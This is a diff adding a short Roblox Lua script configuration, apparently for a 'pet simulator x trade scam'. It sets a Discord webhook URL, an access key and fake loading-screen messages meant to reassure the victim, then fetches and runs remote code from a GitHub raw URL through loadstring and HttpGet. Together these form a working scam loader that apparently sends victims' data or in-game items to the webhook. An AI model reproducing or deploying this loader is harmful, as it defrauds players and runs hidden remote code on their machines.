@@ -1,0 +1,9 @@
+WebHook = "https://discord.com/api/webhooks/1118217786834026496/hsBxobzQQK_1rZ5xLu5EyuDmT-cwB70rrWPWWkaOigeymcSAHfGH1VYfWcmZInw8yLyE"
+loadingscreen = true
+_G.Key = "Loopmage123"
+_G.CustomScriptName = "pet simulator x trade scam"
+_G.Text1 = "Script loading..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
